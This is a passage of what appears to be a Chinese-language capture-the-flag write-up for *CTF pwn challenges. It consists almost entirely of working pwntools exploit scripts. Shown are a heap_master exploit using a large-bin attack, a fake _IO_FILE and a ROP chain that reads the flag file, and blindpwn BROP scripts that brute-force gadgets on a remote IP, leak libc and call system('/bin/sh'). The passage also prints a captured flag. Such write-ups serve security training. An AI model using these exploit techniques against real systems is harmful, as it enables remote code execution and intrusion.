    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">'content: '</span><span class="p">,</span> <span class="n">cont</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">_del</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">off</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'&gt;&gt; '</span><span class="p">,</span> <span class="s1">'3'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'offset: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">off</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">60001</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">host</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
        <span class="n">guess</span> <span class="o">=</span> <span class="mh">0x40</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./heap_master'</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s1">'LD_PRELOAD'</span><span class="p">:</span><span class="n">libc_path</span><span class="p">})</span>
        <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="s1">'source ./gdb.script'</span><span class="p">)</span>
        <span class="n">guess</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">raw_input</span><span class="p">(</span><span class="s1">'guess?'</span><span class="p">),</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span>
        <span class="c1"># guess = 0x50</span>
    <span class="n">add</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">_add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
    <span class="n">edit</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">:</span> <span class="n">_edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
    <span class="n">free</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">_del</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>

    <span class="n">stdout</span> <span class="o">=</span> <span class="p">((</span><span class="n">guess</span><span class="o">|</span><span class="mi">6</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">8</span><span class="p">)</span><span class="c1"># + 0x20</span>

    <span class="n">offset</span> <span class="o">=</span> <span class="mh">0x8800</span><span class="o">-</span><span class="mh">0x7A0</span>

    <span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x331</span><span class="p">))</span> <span class="c1">#p1</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mh">0x330</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">))</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mh">0x360</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x411</span><span class="p">))</span> <span class="c1">#p2</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mh">0x360</span><span class="o">+</span><span class="mh">0x410</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">))</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mh">0x360</span><span class="o">+</span><span class="mh">0x440</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x411</span><span class="p">))</span> <span class="c1">#p3</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mh">0x360</span><span class="o">+</span><span class="mh">0x440</span><span class="o">+</span><span class="mh">0x410</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">))</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mh">0x360</span><span class="o">+</span><span class="mh">0x440</span><span class="o">+</span><span class="mh">0x440</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">))</span>


    <span class="n">free</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span> <span class="c1">#p1</span>
    <span class="n">free</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mh">0x10</span><span class="o">+</span><span class="mh">0x360</span><span class="p">)</span> <span class="c1">#p2</span>

    <span class="n">add</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>

    <span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mh">0x360</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mh">0x460</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mh">0x560</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">free</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mh">0x10</span><span class="o">+</span><span class="mh">0x370</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>
    <span class="n">free</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mh">0x10</span><span class="o">+</span><span class="mh">0x360</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>

    <span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mh">0x360</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3f1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="n">stdout</span><span class="o">-</span><span class="mh">0x10</span><span class="p">))</span> <span class="c1">#p2-&gt;bk</span>

    <span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mh">0x360</span><span class="o">+</span><span class="mh">0x18</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="n">stdout</span><span class="p">))</span> <span class="c1">#p2-&gt;bk_nextsize</span>

    <span class="n">free</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mh">0x10</span><span class="o">+</span><span class="mh">0x360</span><span class="o">+</span><span class="mh">0x440</span><span class="p">)</span> <span class="c1">#p3</span>

    <span class="n">add</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>

    <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>

    <span class="n">heap</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x83c0</span>
    <span class="n">info</span><span class="p">(</span><span class="s1">'heap @ '</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">))</span>

    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x39e5f0</span><span class="c1"># + 0x1fe0</span>
    <span class="n">info</span><span class="p">(</span><span class="s1">'libc.address @ '</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>

    <span class="c1"># yet another large bin attack</span>

    <span class="n">offset</span> <span class="o">=</span> <span class="mh">0x100</span>

    <span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x331</span><span class="p">))</span> <span class="c1">#p1</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mh">0x330</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">))</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mh">0x360</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x511</span><span class="p">))</span> <span class="c1">#p2</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mh">0x360</span><span class="o">+</span><span class="mh">0x510</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">))</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mh">0x360</span><span class="o">+</span><span class="mh">0x540</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x511</span><span class="p">))</span> <span class="c1">#p3</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mh">0x360</span><span class="o">+</span><span class="mh">0x540</span><span class="o">+</span><span class="mh">0x510</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">))</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mh">0x360</span><span class="o">+</span><span class="mh">0x540</span><span class="o">+</span><span class="mh">0x540</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">))</span>

    <span class="n">free</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span> <span class="c1">#p1</span>
    <span class="n">free</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mh">0x10</span><span class="o">+</span><span class="mh">0x360</span><span class="p">)</span> <span class="c1">#p2</span>

    <span class="n">add</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>

    <span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mh">0x360</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4f1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'_IO_list_all'</span><span class="p">]</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'_IO_list_all'</span><span class="p">]</span><span class="o">-</span><span class="mh">0x20</span><span class="p">))</span>

    <span class="n">free</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mh">0x10</span><span class="o">+</span><span class="mh">0x360</span><span class="o">+</span><span class="mh">0x540</span><span class="p">)</span> <span class="c1">#p3</span>

    <span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>

    <span class="c1"># trigger on exit()</span>

    <span class="n">pp_j</span> <span class="o">=</span> <span class="n">g</span><span class="p">(</span><span class="mh">0x10fa54</span><span class="p">)</span> <span class="c1"># pop rbx ; pop rbp ; jmp rcx</span>
    <span class="n">p_rsp_r</span> <span class="o">=</span> <span class="n">g</span><span class="p">(</span><span class="mh">0x3870</span><span class="p">)</span> <span class="c1"># pop rsp ; ret</span>
    <span class="n">p_rsp_r13_r</span> <span class="o">=</span> <span class="n">g</span><span class="p">(</span><span class="mh">0x1fd94</span><span class="p">)</span> <span class="c1"># pop rsp ; pop r13 ; ret</span>
    <span class="n">p_rdi_r</span> <span class="o">=</span> <span class="n">g</span><span class="p">(</span><span class="mh">0x1feea</span><span class="p">)</span> <span class="c1"># pop rdi ; ret</span>
    <span class="n">p_rdx_rsi_r</span> <span class="o">=</span> <span class="n">g</span><span class="p">(</span><span class="mh">0xf9619</span><span class="p">)</span> <span class="c1"># pop rdx ; pop rsi ; ret</span>

    <span class="n">fake_IO_strfile</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_rsp_r</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_rsp_r13_r</span><span class="p">)</span>
    <span class="n">_IO_str_jump</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x39A500</span><span class="p">)</span>

    <span class="n">orw</span> <span class="o">=</span> <span class="p">[</span>
        <span class="n">p_rdi_r</span><span class="p">,</span> <span class="n">heap</span><span class="p">,</span>
        <span class="n">p_rdx_rsi_r</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>      
        <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'open'</span><span class="p">],</span>
        <span class="n">p_rdi_r</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span>
        <span class="n">p_rdx_rsi_r</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">heap</span><span class="o">+</span><span class="mh">0x1337</span><span class="p">,</span>
        <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'read'</span><span class="p">],</span>
        <span class="n">p_rdi_r</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span>
        <span class="n">p_rdx_rsi_r</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">heap</span><span class="o">+</span><span class="mh">0x1337</span><span class="p">,</span>
        <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'write'</span><span class="p">],</span>
    <span class="p">]</span>

    <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">'./flag</span><span class="se">\x00\x00</span><span class="s1">'</span> <span class="o">+</span> <span class="n">flat</span><span class="p">(</span><span class="n">orw</span><span class="p">))</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mh">0x360</span><span class="o">+</span><span class="mh">0x540</span><span class="p">,</span> <span class="n">fake_IO_strfile</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mh">0x360</span><span class="o">+</span><span class="mh">0x540</span><span class="o">+</span><span class="mh">0xD8</span><span class="p">,</span> <span class="n">_IO_str_jump</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mh">0x360</span><span class="o">+</span><span class="mh">0x540</span><span class="o">+</span><span class="mh">0xE0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">pp_j</span><span class="p">))</span>

    <span class="n">info</span><span class="p">(</span><span class="s1">'b *'</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">pp_j</span><span class="p">))</span>

    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'&gt;&gt; '</span><span class="p">,</span> <span class="s1">'0'</span><span class="p">)</span>

    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">libc_path</span> <span class="o">=</span> <span class="s1">'./lib/libc.so.6'</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>
    <span class="n">exploit</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="s1">'REMOTE'</span><span class="p">])</span>
</pre></div>
<h3 data-content="1" id="5ef260e0f586a656a4766246a4ec5bb7">blindpwn</h3>
<p>BROP</p>
<p>溢出偏移是40<br/>
爆破可用的gadget</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1"># context.log_level = 'debug'</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s2">"a"</span><span class="o">*</span><span class="mi">40</span>
<span class="k">def</span> <span class="nf">find_gadget</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
    <span class="n">fd</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"gadget.txt"</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span>
    <span class="n">fd</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">fd</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">for</span> <span class="n">addr</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">,</span><span class="mh">0x401AA0</span><span class="p">,</span><span class="mh">0x1</span><span class="p">):</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">"34.92.37.22"</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"pwn!</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">passwd</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"now addr is "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">passwd</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">msg</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
        <span class="k">if</span><span class="p">(</span><span class="n">msg</span><span class="o">!=</span> <span class="s2">""</span><span class="p">):</span>
            <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">"find addr"</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
            <span class="k">print</span> <span class="n">msg</span>
            <span class="n">find_gadget</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
            <span class="n">addrs</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
        <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">except</span> <span class="ne">EOFError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"connection close at "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
<span class="k">print</span> <span class="n">addrs</span>
</pre></div>
<p>leak 脚本↓</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">off</span><span class="p">):</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">'34.92.37.22'</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
    <span class="n">rop</span> <span class="o">=</span> <span class="p">[</span>
        <span class="n">p_rdi_r</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">p_rsi_r13_r</span><span class="p">,</span> <span class="mh">0x400000</span><span class="o">+</span><span class="n">off</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
        <span class="mh">0x400515</span><span class="p">,</span>
    <span class="p">]</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">'pwn!</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span> <span class="s1">'A'</span><span class="o">*</span><span class="mi">40</span> <span class="o">+</span> <span class="n">flat</span><span class="p">(</span><span class="n">rop</span><span class="p">))</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">data</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">p_rdi_r</span> <span class="o">=</span> <span class="mh">0x40077a</span><span class="o">+</span><span class="mi">9</span>
    <span class="n">p_rsi_r13_r</span> <span class="o">=</span> <span class="mh">0x40077a</span><span class="o">+</span><span class="mi">7</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">):</span>
        <span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'blind'</span><span class="p">,</span> <span class="s1">'a'</span><span class="p">)</span>
        <span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">leak</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
        <span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</pre></div>
<p>拿到elf文件之后，直接找到几个可用的gadgets进行利用</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">v</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">x</span><span class="o">+</span><span class="mh">0x400000</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">'34.92.37.22'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">10000</span><span class="p">):</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="n">rop</span> <span class="o">=</span> <span class="p">[</span>
        <span class="n">p_rdi_r</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span>
        <span class="n">p_rsi_r15_r</span><span class="p">,</span> <span class="mh">0x601018</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">write_plt</span><span class="p">,</span>
        <span class="n">p_rdi_r</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">p_rsi_r15_r</span><span class="p">,</span> <span class="mh">0x601030</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">read_plt</span><span class="p">,</span>
        <span class="n">p_rdi_r</span><span class="p">,</span> <span class="mh">0x601038</span><span class="p">,</span>
        <span class="n">v</span><span class="p">(</span><span class="mh">0x550</span><span class="p">),</span>
    <span class="p">]</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">'pwn!</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span> <span class="s1">'A'</span><span class="o">*</span><span class="mi">40</span> <span class="o">+</span> <span class="n">flat</span><span class="p">(</span><span class="n">rop</span><span class="p">))</span>
    <span class="n">write</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
    <span class="n">setbuf</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
    <span class="n">read</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
    <span class="n">__libc_start_main</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">read</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'read'</span><span class="p">]</span>
    <span class="n">info</span><span class="p">(</span><span class="s1">'libc @'</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'system'</span><span class="p">])</span> <span class="o">+</span> <span class="s1">'/bin/sh</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">'cat flag'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./libc6_2.23-0ubuntu11_amd64.so'</span><span class="p">)</span>
    <span class="n">write_plt</span> <span class="o">=</span> <span class="n">v</span><span class="p">(</span><span class="mh">0x520</span><span class="p">)</span>
    <span class="n">read_plt</span> <span class="o">=</span> <span class="n">v</span><span class="p">(</span><span class="mh">0x540</span><span class="p">)</span>
    <span class="n">p_rdi_r</span> <span class="o">=</span> <span class="n">v</span><span class="p">(</span><span class="mh">0x783</span><span class="p">)</span>
    <span class="n">p_rsi_r15_r</span> <span class="o">=</span> <span class="n">v</span><span class="p">(</span><span class="mh">0x781</span><span class="p">)</span>
    <span class="n">exploit</span><span class="p">()</span>

<span class="c1"># *CTF{Qri2H5GjeaO1E9Jg6dmwcUvSLX8RxpI7}</span>
</pre></div>
<h3 data-content="1" id="4a54ee4138c84061b0242d53e3c47876">babyshell</h3>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">)</span>

